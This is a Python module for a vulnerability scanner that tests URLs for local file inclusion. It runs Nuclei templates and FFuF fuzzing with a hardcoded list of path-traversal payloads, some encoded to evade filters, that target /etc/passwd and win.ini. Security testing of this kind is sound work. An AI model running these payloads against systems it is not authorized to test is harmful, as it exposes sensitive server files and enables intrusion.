"""
LFI (Local File Inclusion) / Path Traversal Testing Module

Tests for LFI/directory traversal vulnerabilities:
- FFuF with LFI wordlists
- Nuclei LFI templates

Attempts to read sensitive files like /etc/passwd.
"""

import asyncio
import json
import re
from pathlib import Path
from typing import List, Dict, Any, Callable, Optional

from loguru import logger

from app.core.executor import executor
from app.utils.helpers import read_lines, write_lines
from app.config import settings


class LFIScanner:
    """
    LFI/Path Traversal vulnerability scanner.
    """
    
    def __init__(
        self,
        work_dir: Path,
        log_callback: Optional[Callable] = None
    ):
        self.work_dir = work_dir
        self.log = log_callback or self._default_log
    
    async def _default_log(self, msg: str):
        logger.info(msg)
    
    async def run(self, urls: List[str]) -> List[Dict[str, Any]]:
        """
        Scan URLs for LFI vulnerabilities.
        
        Args:
            urls: List of URLs with parameters
            
        Returns:
            List of vulnerability dictionaries
        """
        self.work_dir.mkdir(parents=True, exist_ok=True)
        
        # Filter URLs with file-related parameters
        lfi_candidates = []
        for url in urls:
            lower = url.lower()
            if any(param in lower for param in [
                "file=", "page=", "path=", "document=", "folder=",
                "root=", "include=", "dir=", "style=", "template=",
                "php_path=", "doc=", "pdf=", "view=", "content=",
                "layout=", "mod=", "conf=",
            ]):
                lfi_candidates.append(url)
        
        if not lfi_candidates:
            await self.log("[!] No LFI candidate URLs found")
            return []
        
        await self.log(f"[*] Testing {len(lfi_candidates)} URLs for LFI...")
        
        input_file = self.work_dir / "lfi_urls.txt"
        write_lines(input_file, lfi_candidates)
        
        vulnerabilities = []
        
        # Run tools
        tasks = []
        
        if await executor.check_tool("nuclei"):
            tasks.append(self._run_nuclei_lfi(input_file))
        
        if await executor.check_tool("ffuf"):
            tasks.append(self._run_ffuf_lfi(lfi_candidates[:10]))
        
        if tasks:
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            for result in results:
                if isinstance(result, Exception):
                    await self.log(f"[!] Tool error: {str(result)}")
                elif isinstance(result, list):
                    vulnerabilities.extend(result)
        
        await self.log(f"[+] Found {len(vulnerabilities)} LFI vulnerabilities")
        
        return vulnerabilities
    
    async def _run_nuclei_lfi(self, input_file: Path) -> List[Dict[str, Any]]:
        """Run Nuclei with LFI templates."""
        await self.log("[*] Running Nuclei LFI templates...")
        
        output_file = self.work_dir / "nuclei_lfi.json"
        
        result = await executor.run(
            "nuclei",
            [
                "-l", str(input_file),
                "-t", "http/vulnerabilities/lfi/",
                "-t", "dast/vulnerabilities/lfi/",
                "-jsonl",
                "-o", str(output_file),
            ],
            timeout=1200,
        )
        
        vulnerabilities = []
        
        if output_file.exists():
            for line in read_lines(output_file):
                try:
                    data = json.loads(line)
                    
                    vulnerabilities.append({
                        "type": "lfi",
                        "severity": data.get("info", {}).get("severity", "high"),
                        "url": data.get("matched-at", ""),
                        "template_id": data.get("template-id", ""),
                        "evidence": str(data.get("extracted-results", "")),
                        "tool": "nuclei",
                    })
                except json.JSONDecodeError:
                    continue
        
        await self.log(f"[+] Nuclei found {len(vulnerabilities)} LFI")
        
        return vulnerabilities
    
    async def _run_ffuf_lfi(self, urls: List[str]) -> List[Dict[str, Any]]:
        """Run FFuF with LFI payloads."""
        await self.log("[*] Running FFuF LFI fuzzing...")
        
        vulnerabilities = []
        
        # LFI payloads
        lfi_payloads = [
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
            "..%252f..%252f..%252fetc/passwd",
            "/etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "....\\\\....\\\\....\\\\windows\\win.ini",
        ]
        
        # Create a simple payloads file
        payload_file = self.work_dir / "lfi_payloads.txt"
        write_lines(payload_file, lfi_payloads)
        
        for url in urls:
            # Replace parameter value with FUZZ
            fuzz_url = re.sub(r'=([^&]*)', '=FUZZ', url)
            
            output_file = self.work_dir / f"ffuf_lfi_{hash(url) % 10000}.json"
            
            result = await executor.run(
                "ffuf",
                [
                    "-w", str(payload_file),
                    "-u", fuzz_url,
                    "-mc", "200",          # Match 200 OK
                    "-mr", "root:x:",      # Match /etc/passwd content
                    "-json",
                    "-o", str(output_file),
                ],
                timeout=120,
            )
            
            if output_file.exists():
                try:
                    with open(output_file, 'r') as f:
                        data = json.load(f)
                        
                        for res in data.get("results", []):
                            vulnerabilities.append({
                                "type": "lfi",
                                "severity": "critical",
                                "url": res.get("url", url),
                                "payload": res.get("input", {}).get("FUZZ", ""),
                                "evidence": "Matched /etc/passwd content",
                                "tool": "ffuf",
                            })
                except Exception:
                    pass
        
        await self.log(f"[+] FFuF found {len(vulnerabilities)} LFI")
        
        return vulnerabilities
